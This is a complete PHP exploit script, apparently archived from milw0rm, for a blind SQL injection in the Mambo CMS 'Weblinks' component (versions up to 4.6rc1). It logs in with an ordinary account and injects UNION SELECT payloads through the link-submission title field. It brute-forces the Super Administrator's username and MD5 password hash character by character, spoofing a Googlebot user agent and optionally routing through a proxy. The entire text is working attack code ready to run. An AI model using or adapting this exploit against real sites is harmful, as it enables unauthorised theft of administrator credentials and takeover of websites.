#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Mambo <= 4.6rc1 'Weblinks' blind SQL injection / admin credentials\r\n";
echo "disclosure exploit ii (quicker and more effective version, but it floods\r\n";
echo "admin of links submissions...)\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n";


if ($argc<5) {
echo "Usage: php ".$argv[0]." host path user pass OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to Mambo\r\n";
echo "user/pass: you need an account\r\n";
echo "Options:\r\n";
echo "   -T[prefix]   specify a table prefix different from 'mos_'\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Example:\r\n";
echo "php ".$argv[0]." localhost /mambo/ username password\r\n";
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=$argv[4];
$port=80;
$prefix="mos_";
$proxy="";
for ($i=5; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data ="username=".$user;
$data.="&passwd=".$pass;
$data.="&remember=yes";
$data.="&option=login";
$data.="&Submit=login";
$data.="&op2=login";
$data.="&lang=english";
$data.="&return=".urlencode("http://".$host.$path);
$data.="&message=0";
$packet ="POST ".$p." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<=count($temp)-1; $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
if ((strstr($cookie,"=+;")) | $cookie=="") {die("Unable to login...");}
else
{
echo "Done...\r\ncookie -> ".$cookie."\r\n";
}

$j=1;$admin="";
while (!strstr($admin,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
$sql="99999' UNION SELECT ASCII(SUBSTRING(username,".$j.",1))=".$i." FROM ".$prefix."users WHERE usertype='Super Administrator'/*";
echo "\r\n".$sql."\r\n";
$sql=urlencode($sql);
$data ="title=".$sql;
$data.="&catid=2";
$data.="&url=http://www.google.com";
$data.="&description=";
$data.="&id=0";
$data.="&option=com_weblinks";
$data.="&task=save";
$data.="&ordering=0";
$data.="&approved=0";
$data.="&Returnid=0";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
//debug
//echo quick_dump($packet)."\r\n";
sendpacketii($packet);
if (eregi("please try again",$html)) {$admin.=chr($i);echo "admin -> ".$admin."[???]\r\n";sleep(2);break;} //more than seven seconds? we succeed...
if ($i==255) {die("Exploit failed...");}
}
$j++;
}

$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
//print_r(array_values($md5s));

$j=1;
$password="";
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$md5s))
{
  $sql="99999' UNION SELECT ASCII(SUBSTRING(password,".$j.",1))=".$i." FROM ".$prefix."users WHERE usertype='Super Administrator'/*";
  echo "\r\n".$sql."\r\n";
  $sql=urlencode($sql);
  $data ="title=".$sql;
  $data.="&catid=2";
  $data.="&url=http://www.google.com";
  $data.="&description=";
  $data.="&id=0";
  $data.="&option=com_weblinks";
  $data.="&task=save";
  $data.="&ordering=0";
  $data.="&approved=0";
  $data.="&Returnid=0";
  $packet ="POST ".$p."index.php HTTP/1.0\r\n";
  $packet.="User-Agent: Googlebot/2.1\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Accept: text/plain\r\n";
  $packet.="Connection: Close\r\n";
  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
  $packet.="Cookie: ".$cookie."\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
  $packet.=$data;
  //debug
  //echo quick_dump($packet)."\r\n";
  sendpacketii($packet);
  if (eregi("please try again",$html)) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
}
  if ($i==255) {die("Exploit failed...");}
  }
  $j++;
}
//if you are here...
echo "Exploit succeeded...\r\n";
echo "--------------------------------------------------------------------\r\n";
echo "admin          -> ".$admin."\r\n";
echo "password (md5) -> ".$password."\r\n";
echo "--------------------------------------------------------------------\r\n";
?>

# milw0rm.com [2006-06-22]
            